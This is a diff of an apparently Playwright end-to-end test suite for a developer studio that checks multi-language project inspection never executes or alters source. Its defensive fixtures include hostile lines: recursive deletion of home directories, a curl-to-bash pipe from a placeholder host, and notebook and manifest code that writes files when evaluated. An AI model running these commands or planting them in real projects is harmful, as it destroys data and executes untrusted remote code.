+    'cmake_minimum_required(VERSION 3.16)\nproject(v20_browser LANGUAGES C CXX)\nadd_executable(v20-app v20-browser.cpp)\n');
+  writeFileSync(path.join(devProject,'compile_commands.json'),JSON.stringify([{
+    file:'v20-browser.cpp',directory:devProject,command:'clang++ -DSECRET_TOKEN_NEVER_DISPLAY -c v20-browser.cpp'
+  }]));
+  await page.locator('#dsNativeInspect').click();
+  await page.waitForFunction(()=>document.querySelector('#dsNativeStatus')?.textContent?.includes('Native inspection complete'));
+  const v20Body=await page.locator('#dsNativeResults').innerText();
+  assert.match(v20Body,/v20-browser\.cpp/);
+  assert.match(v20Body,/native_test/);
+  assert.match(v20Body,/compile command entries safely inspected/);
+  assert.doesNotMatch(v20Body,/SECRET_TOKEN_NEVER_DISPLAY/);
+  assert.deepEqual(readFileSync(v20NativeFile,'utf8'),v20NativeSource,'V20 native project inspection never edits source');
+  await page.locator('#dsNativeAgent').click();
+  assert.equal(await page.locator('#studioAgentAction').inputValue(),'deployment_readiness');
+  assert.match(await page.locator('#studioAgentMessage').inputValue(),/V20 C\/C\+\+ release readiness/);
+  assert.deepEqual(readFileSync(v20NativeFile,'utf8'),v20NativeSource,'V20 Agent review does not deploy');
+  await page.screenshot({path:path.join(output,'developer-studio-v20-native-c-cpp.png')});
+
+  // V21: inert Java/JVM Maven/JUnit/Spring discovery and central Agent review.
+  const v21Java=path.join(devProject,'v21-browser.java');
+  const v21JavaSource='package example;\nimport org.junit.jupiter.api.Test;\n@SpringBootApplication\npublic class V21BrowserService { public static void main(String[] args) {} }\n';
+  writeFileSync(v21Java,v21JavaSource);
+  writeFileSync(path.join(devProject,'pom.xml'),
+    '<project><modelVersion>4.0.0</modelVersion><groupId>example</groupId>'+
+    '<artifactId>v21-browser-service</artifactId><version>1.0.0</version>'+
+    '<properties><maven.compiler.release>21</maven.compiler.release></properties>'+
+    '<dependencies><dependency><groupId>org.junit.jupiter</groupId>'+
+    '<artifactId>junit-jupiter</artifactId><version>5.11.4</version></dependency></dependencies>'+
+    '</project>');
+  await page.locator('#dsJvmInspect').click();
+  await page.waitForFunction(()=>document.querySelector('#dsJvmStatus')?.textContent?.includes('JVM inspection complete'));
+  const v21Body=await page.locator('#dsJvmResults').innerText();
+  assert.match(v21Body,/v21-browser-service/);
+  assert.match(v21Body,/JUnit Jupiter/);
+  assert.match(v21Body,/Spring/);
+  assert.match(v21Body,/Installed tools, fingerprints only/);
+  assert.deepEqual(readFileSync(v21Java,'utf8'),v21JavaSource,
+    'V21 JVM inspection must never execute or alter source');
+  await page.locator('#dsJvmAgent').click();
+  assert.equal(await page.locator('#studioAgentAction').inputValue(),'deployment_readiness');
+  assert.match(await page.locator('#studioAgentMessage').inputValue(),/V21 Java\/JVM release readiness/);
+  assert.deepEqual(readFileSync(v21Java,'utf8'),v21JavaSource,
+    'Central Agent review cannot alter Java source or deploy');
+  await page.screenshot({path:path.join(output,'developer-studio-v21-java-jvm.png')});
+
+  // V22: inert .NET SDK, NuGet, ASP.NET/Blazor and shared central Agent review.
+  const v22CSharpFile=path.join(devProject,'V22Browser.cs');
+  const v22CSharpSource='namespace AutoMoto.V22;\npublic class V22Browser { public static int Value() => 42; }\n';
+  writeFileSync(v22CSharpFile,v22CSharpSource);
+  writeFileSync(path.join(devProject,'V22.Browser.csproj'),
+    '<Project Sdk="Microsoft.NET.Sdk.Web"><PropertyGroup>'+
+    '<TargetFramework>net8.0</TargetFramework></PropertyGroup>'+
+    '<ItemGroup><PackageReference Include="xunit" Version="2.9.2"/>'+
+    '<PackageReference Include="NUnit" Version="4.3.2"/></ItemGroup></Project>');
+  writeFileSync(path.join(devProject,'V22Component.razor'),'@page "/v22"\n<h1>Native .NET evidence</h1>\n');
+  await page.locator('#dsDotnetInspect').click();
+  await page.waitForFunction(()=>document.querySelector('#dsDotnetStatus')?.textContent?.includes('inspection completed'));
+  const v22Body=await page.locator('#dsDotnetResults').innerText();
+  assert.match(v22Body,/V22\.Browser\.csproj/);
+  assert.match(v22Body,/net8\.0/);
+  assert.match(v22Body,/xunit/);
+  assert.match(v22Body,/ASP\.NET Core/);
+  assert.match(v22Body,/Blazor/);
+  assert.match(v22Body,/Installed SDK\/IDE tools/);
+  assert.deepEqual(readFileSync(v22CSharpFile,'utf8'),v22CSharpSource,
+    'V22 .NET source inspection cannot compile, execute or alter files');
+  await page.locator('#dsDotnetAgent').click();
+  assert.equal(await page.locator('#studioAgentAction').inputValue(),'deployment_readiness');
+  assert.match(await page.locator('#studioAgentMessage').inputValue(),/V22 C#\/\.NET release readiness/);
+  assert.deepEqual(readFileSync(v22CSharpFile,'utf8'),v22CSharpSource,
+    'V22 shared Agent release review cannot deploy or rewrite files');
+  await page.screenshot({path:path.join(output,'developer-studio-v22-dotnet-csharp.png')});
+
+  // V23: static Kotlin/Android/Compose metadata and shared Agent hand-off.
+  const v23Kotlin=path.join(devProject,'app','src','main','java','com','automoto','v23','V23Screen.kt');
+  const v23Source='package com.automoto.v23\nimport androidx.compose.runtime.Composable\n@Composable fun V23Screen() { }\n';
+  mkdirSync(path.dirname(v23Kotlin),{recursive:true});
+  mkdirSync(path.join(devProject,'gradle','wrapper'),{recursive:true});
+  writeFileSync(v23Kotlin,v23Source);
+  writeFileSync(path.join(devProject,'settings.gradle.kts'),
+    'pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }\nrootProject.name="V23Browser"\ninclude(":app")\n');
+  writeFileSync(path.join(devProject,'build.gradle.kts'),
+    'plugins { id("com.android.application") version "8.13.2" apply false; id("org.jetbrains.kotlin.android") version "2.2.21" apply false }\n');
+  writeFileSync(path.join(devProject,'app','build.gradle.kts'),
+    'plugins { id("com.android.application"); id("org.jetbrains.kotlin.android") }\nandroid { namespace = "com.automoto.v23"; compileSdk = 35 }\n');
+  writeFileSync(path.join(devProject,'app','src','main','AndroidManifest.xml'),
+    '<?xml version="1.0"?><manifest xmlns:android="http://schemas.android.com/apk/res/android"><application/></manifest>');
+  writeFileSync(path.join(devProject,'gradle','wrapper','gradle-wrapper.properties'),
+    'distributionUrl=https\\://services.gradle.org/distributions/gradle-8.13-bin.zip\n');
+  await page.locator('#dsAndroidInspect').click();
+  await page.waitForFunction(()=>document.querySelector('#dsAndroidStatus')?.textContent?.includes('inspection complete'));
+  const v23Body=await page.locator('#dsAndroidResults').innerText();
+  assert.match(v23Body,/V23Screen\.kt/);
+  assert.match(v23Body,/8\.13\.2/);
+  assert.match(v23Body,/Compose: heuristic evidence only/);
+  assert.match(v23Body,/emulator/i);
+  assert.match(v23Body,/No device connection, AVD launch/);
+  assert.deepEqual(readFileSync(v23Kotlin,'utf8'),v23Source,
+    'Kotlin inspection does not edit or execute source');
+  await page.locator('#dsAndroidAgent').click();
+  assert.equal(await page.locator('#studioAgentAction').inputValue(),'deployment_readiness');
+  assert.match(await page.locator('#studioAgentMessage').inputValue(),/V23 Kotlin\/Android readiness/);
+  assert.deepEqual(readFileSync(v23Kotlin,'utf8'),v23Source,
+    'V23 shared Agent review does not deploy or rewrite Kotlin source');
+  await page.screenshot({path:path.join(output,'developer-studio-v23-kotlin-android.png')});
+
+  // V24: inert Swift/SwiftUI, SwiftPM and SourceKit-LSP inspection; no simulator.
+  const v24SwiftFile=path.join(devProject,'V24Browser.swift');
+  const v24SwiftSource='import SwiftUI\nstruct V24BrowserView: View { var body: some View { Text("V24_SWIFTUI") } }\n';
+  writeFileSync(v24SwiftFile,v24SwiftSource);
+  writeFileSync(path.join(devProject,'Package.swift'),
+    '// swift-tools-version: 5.9\nimport PackageDescription\n'+
+    'let package = Package(name: "V24Browser", targets: [.executableTarget(name: "V24Browser")])\n');
+  await page.locator('#dsSwiftInspect').click();
+  await page.waitForFunction(()=>document.querySelector('#dsSwiftStatus')?.textContent?.includes('inspection complete'));
+  const v24Body=await page.locator('#dsSwiftResults').innerText();
+  assert.match(v24Body,/V24Browser\.swift/);
+  assert.match(v24Body,/V24BrowserView/);
+  assert.match(v24Body,/SwiftUI/);
+  assert.match(v24Body,/SwiftPM executable: V24Browser/);
+  assert.match(v24Body,/Simulator state: not_queried/);
+  assert.match(v24Body,/SourceKit-LSP/);
+  assert.deepEqual(readFileSync(v24SwiftFile,'utf8'),v24SwiftSource,
+    'V24 read-only Swift inspection must not execute or alter source');
+  await page.locator('#dsSwiftAgent').click();
+  assert.equal(await page.locator('#studioAgentAction').inputValue(),'deployment_readiness');
+  assert.match(await page.locator('#studioAgentMessage').inputValue(),/V24 Swift\/iOS release readiness/);
+  assert.deepEqual(readFileSync(v24SwiftFile,'utf8'),v24SwiftSource,
+    'V24 central Agent review cannot boot an iOS Simulator or change source');
+  await page.screenshot({path:path.join(output,'developer-studio-v24-swift-ios.png')});
+
+  // V25: read-only Flutter/Dart and React Native mobile bridge evidence.
+  const v25Dart=path.join(devProject,'lib','main.dart');
+  const v25DartSource='import "package:flutter/material.dart";\nvoid main() => runApp(const V25App());\nclass V25App extends StatelessWidget { const V25App({super.key}); @override Widget build(BuildContext context) => const Text("V25_FLUTTER_WEB_PASS"); }\n';
+  mkdirSync(path.dirname(v25Dart),{recursive:true});
+  writeFileSync(v25Dart,v25DartSource);
+  writeFileSync(path.join(devProject,'pubspec.yaml'),
+    'name: automoto_v25_browser\nenvironment:\n  sdk: ">=3.5.0 <4.0.0"\ndependencies:\n  flutter:\n    sdk: flutter\n');
+  writeFileSync(path.join(devProject,'package.json'),JSON.stringify({
+    name:'automoto-v25-rn-browser',version:'1.0.0',
+    dependencies:{'react-native':'0.88.1',react:'19.3.0'}
+  }));
+  writeFileSync(path.join(devProject,'index.js'),
+    'const {AppRegistry} = require("react-native");\nAppRegistry.registerComponent("V25",()=>()=>null);\n');
+  const v25RN=path.join(devProject,'App.js');
+  const v25RNSource='import React from "react";\nimport {View, Text} from "react-native";\nexport function V25RNApp() { return <View><Text>V25_RN_METRO_PASS</Text></View>; }\n';
+  writeFileSync(v25RN,v25RNSource);
+  await page.locator('#dsMobileInspect').click();
+  await page.waitForFunction(()=>document.querySelector('#dsMobileStatus')?.textContent?.includes('inspection complete'));
+  const v25Body=await page.locator('#dsMobileResults').innerText();
+  assert.match(v25Body,/automoto_v25_browser/);
+  assert.match(v25Body,/automoto-v25-rn-browser/);
+  assert.match(v25Body,/React Native components/);
+  assert.match(v25Body,/Flutter widgets/);
+  assert.match(v25Body,/Device targets: not_queried/);
+  assert.match(v25Body,/Mixed Flutter and React Native roots are inspection-only/);
+  assert.deepEqual(readFileSync(v25Dart,'utf8'),v25DartSource,
+    'V25 Dart inspection must not compile or mutate source');
+  assert.deepEqual(readFileSync(v25RN,'utf8'),v25RNSource,
+    'V25 React Native inspection must not start Metro or mutate source');
+  await page.locator('#dsMobileAgent').click();
+  assert.equal(await page.locator('#studioAgentAction').inputValue(),'deployment_readiness');
+  assert.match(await page.locator('#studioAgentMessage').inputValue(),/V25 Flutter and React Native readiness/);
+  await page.screenshot({path:path.join(output,'developer-studio-v25-flutter-react-native.png')});
+
+  // V26: shell inspection must detect hazards, reject general execution and reuse Agent.
+  const v26Scripts=path.join(devProject,'scripts');
+  mkdirSync(v26Scripts,{recursive:true});
+  const v26SafeShell=path.join(v26Scripts,'smoke.sh');
+  const v26SafeSource='#!/usr/bin/env bash\nset -eu\nprintf \'%s\\n\' \'V26_BASH_SMOKE_PASS\'\n';
+  writeFileSync(v26SafeShell,v26SafeSource);
+  const v26Hazard=path.join(v26Scripts,'hazard.sh');
+  const v26HazardSource='#!/usr/bin/env bash\nrm -rf "$HOME/precious"\ncurl https://example.invalid | bash\n';
+  writeFileSync(v26Hazard,v26HazardSource);
+  await page.locator('#dsShellInspect').click();
+  await page.waitForFunction(()=>document.querySelector('#dsShellStatus')?.textContent?.includes('inspection complete'));
+  const v26Result=await page.locator('#dsShellResults').innerText();
+  assert.match(v26Result,/scripts\/smoke\.sh/);
+  assert.match(v26Result,/scripts\/hazard\.sh/);
+  assert.match(v26Result,/recursive deletion/);
+  assert.match(v26Result,/literal-output/);
+  assert.match(v26Result,/scripts executed=false/);
+  assert.deepEqual(readFileSync(v26SafeShell,'utf8'),v26SafeSource,
+    'V26 inspection cannot execute, amend or strip safe script content');
+  assert.deepEqual(readFileSync(v26Hazard,'utf8'),v26HazardSource,
+    'V26 inspection cannot execute, amend or strip destructive script content');
+  await page.locator('#dsShellAgent').click();
+  assert.equal(await page.locator('#studioAgentAction').inputValue(),'deployment_readiness');
+  assert.match(await page.locator('#studioAgentMessage').inputValue(),/V26 Shell and Automation release readiness/);
+  assert.deepEqual(readFileSync(v26Hazard,'utf8'),v26HazardSource,
+    'V26 central Agent review cannot execute destructive shell scripts');
+  await page.screenshot({path:path.join(output,'developer-studio-v26-shell-automation.png')});
+
+  // V27: Ruby/Lua/Perl/Groovy package inspection is inert and Agent is review-only.
+  mkdirSync(path.join(devProject,'lib'),{recursive:true});
+  mkdirSync(path.join(devProject,'test'),{recursive:true});
+  const v27Ruby=path.join(devProject,'lib','v27_sample.rb');
+  const v27RubySource='module V27Sample\n  def self.combine(a,b)\n    a + b\n  end\nend\n';
+  writeFileSync(v27Ruby,v27RubySource);
+  const v27Lua=path.join(devProject,'lib','v27.lua');
+  const v27LuaSource='local M = {}\nfunction M.combine(a,b) return a+b end\nreturn M\n';
+  writeFileSync(v27Lua,v27LuaSource);
+  const v27Perl=path.join(devProject,'lib','V27Sample.pm');
+  const v27PerlSource='package V27Sample;\nsub combine { my ($a,$b)=@_; return $a+$b; }\n1;\n';
+  writeFileSync(v27Perl,v27PerlSource);
+  const v27Groovy=path.join(devProject,'V27Sample.groovy');
+  const v27GroovySource='class V27Sample { static int combine(int a,int b) { a+b } }\n';
+  writeFileSync(v27Groovy,v27GroovySource);
+  writeFileSync(path.join(devProject,'Gemfile'),"source 'https://rubygems.org'\ngem 'rake'\n");
+  writeFileSync(path.join(devProject,'cpanfile'),"requires 'Test::More';\n");
+  const v27Malicious=path.join(devProject,'test','malicious.rb');
+  const v27MaliciousSource="system('rm', '-rf', '/home')\n";
+  writeFileSync(v27Malicious,v27MaliciousSource);
+  await page.locator('#dsScriptingInspect').click();
+  await page.waitForFunction(()=>
+    document.querySelector('#dsScriptingStatus')?.textContent?.includes('inventory complete'));
+  const v27Output=await page.locator('#dsScriptingResults').innerText();
+  assert.match(v27Output,/lib\/v27_sample\.rb/);
+  assert.match(v27Output,/lib\/v27\.lua/);
+  assert.match(v27Output,/lib\/V27Sample\.pm/);
+  assert.match(v27Output,/V27Sample\.groovy/);
+  assert.match(v27Output,/ruby declared packages: rake/);
+  assert.match(v27Output,/perl declared packages: Test::More/);
+  assert.match(v27Output,/external process/);
+  assert.match(v27Output,/no install: true/);
+  assert.deepEqual(readFileSync(v27Ruby,'utf8'),v27RubySource,'Ruby discovery must not execute/edit source');
+  assert.deepEqual(readFileSync(v27Lua,'utf8'),v27LuaSource,'Lua discovery must not execute/edit source');
+  assert.deepEqual(readFileSync(v27Perl,'utf8'),v27PerlSource,'Perl discovery must not execute/edit source');
+  assert.deepEqual(readFileSync(v27Groovy,'utf8'),v27GroovySource,'Groovy discovery must not execute/edit source');
+  assert.deepEqual(readFileSync(v27Malicious,'utf8'),v27MaliciousSource,
+    'Malicious Ruby source remains byte-identical and unexecuted');
+  await page.locator('#dsScriptingAgent').click();
+  assert.equal(await page.locator('#studioAgentAction').inputValue(),'deployment_readiness');
+  assert.match(await page.locator('#studioAgentMessage').inputValue(),/V27 Ruby, Lua, Perl and Groovy readiness/);
+  await page.screenshot({path:path.join(output,'developer-studio-v27-scripting.png')});
+
+  // V28: numerical experiment/source/lock/notebook inspection is fully inert.
+  const v28Experiments=path.join(devProject,'experiments');
+  const v28Data=path.join(devProject,'data');
+  const v28Notebook=path.join(devProject,'notebooks');
+  for(const folder of [v28Experiments,v28Data,v28Notebook])mkdirSync(folder,{recursive:true});
+  const v28CSV=path.join(v28Data,'measurements.csv');
+  const v28CSVSource='value\n10\n20\n30\n40\n50\n';
+  writeFileSync(v28CSV,v28CSVSource);
+  const v28Manifest=path.join(devProject,'experiment.json');
+  writeFileSync(v28Manifest,JSON.stringify({
+    version:1,name:'V28-Reproducible-Mean',dataset:'data/measurements.csv',
+    column:'value',expected:{count:5,sum:150,mean:30},
+    scripts:{r:'experiments/compute.R',julia:'experiments/compute.jl',octave:'experiments/compute.m'}
+  }));
+  const v28Scripts={
+    'compute.R':'values <- read.csv("data/measurements.csv")$value\nprint(mean(values))\n',
+    'compute.jl':'values = [10,20,30,40,50]\nprintln(sum(values))\n',
+    'compute.m':'values = [10,20,30,40,50]; disp(mean(values));\n'
+  };
+  for(const [name,source] of Object.entries(v28Scripts))
+    writeFileSync(path.join(v28Experiments,name),source);
+  writeFileSync(path.join(devProject,'renv.lock'),JSON.stringify({R:{Version:'unknown'},Packages:{}}));
+  writeFileSync(path.join(devProject,'octave-packages.json'),JSON.stringify({packages:[]}));
+  writeFileSync(path.join(v28Notebook,'study.ipynb'),JSON.stringify({
+    nbformat:4,nbformat_minor:5,metadata:{kernelspec:{name:'ir'}},
+    cells:[{cell_type:'code',source:['system("touch V28_BAD")'],metadata:{},
+      outputs:[],execution_count:null}]
+  }));
+  await page.locator('#dsScienceInspect').click();
+  await page.waitForFunction(()=>
+    document.querySelector('#dsScienceStatus')?.textContent?.includes('inspection complete'));
+  const v28Body=await page.locator('#dsScienceResults').innerText();
+  assert.match(v28Body,/V28-Reproducible-Mean/);
+  assert.match(v28Body,/count=5 sum=150 mean=30/);
+  assert.match(v28Body,/Manifest expected data matches: true/);
+  assert.match(v28Body,/experiment\.json/);
+  assert.match(v28Body,/experiments\/compute\.R/);
+  assert.match(v28Body,/experiments\/compute\.jl/);
+  assert.match(v28Body,/experiments\/compute\.m/);
+  assert.match(v28Body,/Jupyter notebooks/);
+  assert.match(v28Body,/never executed or trusted saved outputs/);
+  assert.match(v28Body,/Inspection executed source=false/);
+  assert.deepEqual(readFileSync(v28CSV,'utf8'),v28CSVSource,'V28 CSV cannot be modified by inspection');
+  for(const [name,source] of Object.entries(v28Scripts))
+    assert.deepEqual(readFileSync(path.join(v28Experiments,name),'utf8'),source,
+      'V28 R, Julia or Octave code cannot be executed/modified by inspection');
+  assert.equal(existsSync(path.join(devProject,'V28_BAD')),false,
+    'Notebook code must not run on inspection');
+  await page.locator('#dsScienceAgent').click();
+  assert.equal(await page.locator('#studioAgentAction').inputValue(),'deployment_readiness');
+  assert.match(await page.locator('#studioAgentMessage').inputValue(),/V28 scientific reproducibility/);
+  await page.screenshot({path:path.join(output,'developer-studio-v28-science-reproducibility.png')});
+
+  // V29: Scala/F#/Clojure metadata is discovered without evaluating sbt or EDN.
+  const v29Scala=path.join(devProject,'test','Fixture.scala');
+  const v29Fsharp=path.join(devProject,'test','Fixture.fsx');
+  const v29Clojure=path.join(devProject,'test','fixture_test.clj');
+  const v29ScalaSource='object Fixture extends App { println("V29_SCALA_PASS 42") }\n';
+  const v29FsharpSource='printfn "V29_FSHARP_PASS 42"\n';
+  const v29ClojureSource='(println "V29_CLOJURE_PASS 42")\n';
+  writeFileSync(v29Scala,v29ScalaSource);
+  writeFileSync(v29Fsharp,v29FsharpSource);
+  writeFileSync(v29Clojure,v29ClojureSource);
+  const v29Sbt=path.join(devProject,'build.sbt');
+  const v29Deps=path.join(devProject,'deps.edn');
+  writeFileSync(v29Sbt,'name := "V29 example"\n');
+  writeFileSync(v29Deps,'{:paths ["test"] :deps {}}\n');
+  await page.locator('#dsFunctionalInspect').click();
+  await page.waitForFunction(() =>
+    document.querySelector('#dsFunctionalStatus')?.textContent?.includes('Inert project inventory ready'));
+  const v29Body=await page.locator('#dsFunctionalResults').innerText();
+  assert.match(v29Body,/test\/Fixture\.scala/);
+  assert.match(v29Body,/test\/Fixture\.fsx/);
+  assert.match(v29Body,/test\/fixture_test\.clj/);
+  assert.match(v29Body,/build\.sbt/);
+  assert.match(v29Body,/deps\.edn/);
+  assert.match(v29Body,/Source executed: false/);
+  assert.match(v29Body,/dependencies resolved: false/);
+  assert.deepEqual(readFileSync(v29Scala,'utf8'),v29ScalaSource);
+  assert.deepEqual(readFileSync(v29Fsharp,'utf8'),v29FsharpSource);
+  assert.deepEqual(readFileSync(v29Clojure,'utf8'),v29ClojureSource);
+  assert.equal(await page.locator('#dsFunctionalRun').isEnabled(),false,
+    'V29 must not run an executable unless the project is trusted and tool pinned');
+  await page.locator('#dsFunctionalAgent').click();
+  assert.equal(await page.locator('#studioAgentAction').inputValue(),'deployment_readiness');
+  assert.match(await page.locator('#studioAgentMessage').inputValue(),/V29 Scala, F# and Clojure readiness/);
+  await page.screenshot({path:path.join(output,'developer-studio-v29-functional-enterprise.png')});
+
+  // V30: Elixir, Erlang and Gleam manifest/source discovery must be inert.
+  const v30Elixir=path.join(devProject,'test','v30_fixture.exs');
+  const v30Escript=path.join(devProject,'test','v30_fixture.escript');
+  const v30GleamFolder=path.join(devProject,'src');
+  mkdirSync(v30GleamFolder,{recursive:true});
+  const v30Gleam=path.join(v30GleamFolder,'v30_fixture.gleam');
+  const v30ElixirSource='IO.puts("V30_ELIXIR_PASS 42")\n';
+  const v30EscriptSource='#!/usr/bin/env escript\nmain(_) -> io:format("V30_ERLANG_PASS 42~n").\n';
+  const v30GleamSource='pub fn answer() { 6 * 7 }\n';
+  writeFileSync(v30Elixir,v30ElixirSource);
+  writeFileSync(v30Escript,v30EscriptSource);
+  writeFileSync(v30Gleam,v30GleamSource);
+  writeFileSync(path.join(devProject,'mix.exs'),
+    'File.write!("V30_DANGER", "must never execute this manifest")\n');
+  writeFileSync(path.join(devProject,'rebar.config'),'{deps, []}.\n');
+  writeFileSync(path.join(devProject,'gleam.toml'),
+    'name = "v30_fixture"\nversion = "1.0.0"\ntarget = "erlang"\n[dependencies]\n');
+  await page.locator('#dsBeamInspect').click();
+  await page.waitForFunction(()=>
+    document.querySelector('#dsBeamStatus')?.textContent?.includes('inventory complete'));
+  const v30Text=await page.locator('#dsBeamResults').innerText();
+  assert.match(v30Text,/test\/v30_fixture\.exs/);
+  assert.match(v30Text,/test\/v30_fixture\.escript/);
+  assert.match(v30Text,/src\/v30_fixture\.gleam/);
+  assert.match(v30Text,/mix\.exs/);
+  assert.match(v30Text,/rebar\.config/);
+  assert.match(v30Text,/gleam\.toml/);
+  assert.match(v30Text,/Code executed: false/);
+  assert.match(v30Text,/Dependencies resolved: false/);
+  assert.equal(existsSync(path.join(devProject,'V30_DANGER')),false);
+  assert.deepEqual(readFileSync(v30Elixir,'utf8'),v30ElixirSource);
+  assert.deepEqual(readFileSync(v30Escript,'utf8'),v30EscriptSource);
+  assert.deepEqual(readFileSync(v30Gleam,'utf8'),v30GleamSource);
+  assert.equal(await page.locator('#dsBeamRun').isEnabled(),false);
+  await page.locator('#dsBeamAgent').click();
+  assert.equal(await page.locator('#studioAgentAction').inputValue(),'deployment_readiness');
+  assert.match(await page.locator('#studioAgentMessage').inputValue(),
+    /V30 Elixir, Erlang and Gleam/);
+  await page.screenshot({path:path.join(output,'developer-studio-v30-beam-languages.png')});
+
+  // V31: five-language source inspection must remain inert and review-only.
+  const v31Haskell=path.join(devProject,'test','v31_fixture.hs');
+  const v31Ocaml=path.join(devProject,'test','v31_fixture.ml');
+  const v31Lisp=path.join(devProject,'test','v31_fixture.lisp');
+  const v31Scheme=path.join(devProject,'test','v31_fixture.scm');
+  const v31Prolog=path.join(devProject,'test','v31_fixture.pl');
+  const v31Contents=[
+    ['v31_fixture.hs','main :: IO ()\nmain = putStrLn "V31_HASKELL_PASS 42"\n'],
+    ['v31_fixture.ml','let () = print_endline "V31_OCAML_PASS 42"\n'],
+    ['v31_fixture.lisp','(format t "V31_LISP_PASS 42~%")\n'],
+    ['v31_fixture.scm','(display "V31_SCHEME_PASS 42")\n'],
+    ['v31_fixture.pl','main :- writeln("V31_PROLOG_PASS 42").\n']
+  ];
+  for(const [filename,code] of v31Contents)
+    writeFileSync(path.join(devProject,'test',filename),code);
+  writeFileSync(path.join(devProject,'cabal.project'),'packages: .\n');
+  writeFileSync(path.join(devProject,'dune-project'),'(lang dune 3.0)\n');
+  writeFileSync(path.join(devProject,'project.asd'),
+    '#.(uiop:run-program (list "touch" "V31_DANGER"))\n');
+  writeFileSync(path.join(devProject,'pack.pl'),'name(v31_fixture).\n');
+  await page.locator('#dsLogicInspect').click();
+  await page.waitForFunction(() =>
+    document.querySelector('#dsLogicStatus')?.textContent?.includes('Inspection complete'));
+  const v31Text=await page.locator('#dsLogicResults').innerText();
+  for(const [filename] of v31Contents)
+    assert.ok(v31Text.includes(filename),'V31 source visible: '+filename);
+  for(const name of ['cabal.project','dune-project','project.asd','pack.pl'])
+    assert.ok(v31Text.includes(name),'V31 manifest visible: '+name);
+  assert.match(v31Text,/Runtime used: false/);
+  assert.match(v31Text,/dependencies resolved: false/);
+  assert.equal(existsSync(path.join(devProject,'V31_DANGER')),false);
+  for(const [filename,code] of v31Contents)
+    assert.equal(readFileSync(path.join(devProject,'test',filename),'utf8'),code);
+  assert.equal(await page.locator('#dsLogicRun').isEnabled(),false);
+  await page.locator('#dsLogicAgent').click();
+  assert.equal(await page.locator('#studioAgentAction').inputValue(),'deployment_readiness');
+  assert.match(await page.locator('#studioAgentMessage').inputValue(),
+    /V31 Haskell, OCaml, Common Lisp, Scheme and Prolog/);
+  await page.screenshot({path:path.join(output,'developer-studio-v31-functional-logic.png')});
+
+  // Restore the editor to its pre-V11 single-source context before the
+  // original V2/V3 save/lifecycle regression assertions run.
+  for(const name of ['method.tex','references.bib']){
+    const tab=page.locator('.ds-tab').filter({hasText:name});
+    if(await tab.count())await tab.locator('.ds-tab-close').click();
+  }
+  await page.locator('.ds-tab-select',{hasText:'main.ts'}).click();
+  await page.locator('#dsModeEdit').click();
+  await page.waitForFunction(()=>document.querySelector('#dsSourceText')?.value?.includes('read-only'));
+
   await replaceDeveloperSource('export const title = "edited";\n');
   assert.equal(await page.locator('#dsSaveFile').isEnabled(),true);
   page.once('dialog',dialog=>dialog.dismiss());
@@ -2025,7 +2929,8 @@ let browser;
   await page.locator('#dsModeEdit').click();
   page.once('dialog',dialog=>dialog.accept());
   await page.locator('#dsSaveFile').click();
-  await page.waitForFunction(() => document.querySelector('#dsStatus')?.textContent?.includes('Saved:'));
+  await page.waitForFunction(() => /Saved:|Save blocked:|Save failed:/.test(document.querySelector('#dsStatus')?.textContent||''));
+  assert.match(await page.locator('#dsStatus').innerText(),/Saved:/,'V2 safe save status');
   assert.equal(readFileSync(path.join(devProject,'main.ts'),'utf8'),'export const title = "edited";\n');
   await page.locator('.ds-entry', {hasText:'other.py'}).click();
   await page.waitForFunction(() => document.querySelectorAll('.ds-tab').length===2);
@@ -2204,6 +3109,18 @@ let browser;
     assert.equal(await page.locator('#msgs').evaluate(el => el.scrollTop), 0);
     await page.screenshot({ path: path.join(output, `workspace-${width}.png`) });
   }
+  // Every existing Studio must have one authenticated central Agent link.
+  await page.setViewportSize({width:1280,height:900});
+  for(const name of ['documents','research','spreadsheets','visual','developer']){
+    await page.locator('.nav [data-page="'+name+'"]').click();
+    await page.locator('.studio-agent-bridge').waitFor();
+    await page.waitForFunction(()=>document.querySelector('.studio-agent-state')?.textContent
+      ==='Connected to central agent');
+    assert.equal(await page.locator('.studio-agent-bridge').count(),1,
+      'Every Studio must share one central Agent bridge: '+name);
+  }
+  await page.screenshot({path:path.join(output,'all-five-studios-central-agent.png')});
+
   // Serve the bundled launcher through a browser route; native commands are mocked.
   await page.setViewportSize({ width: 1200, height: 1050 });
   await page.emulateMedia({ colorScheme: 'dark', reducedMotion: 'reduce' });
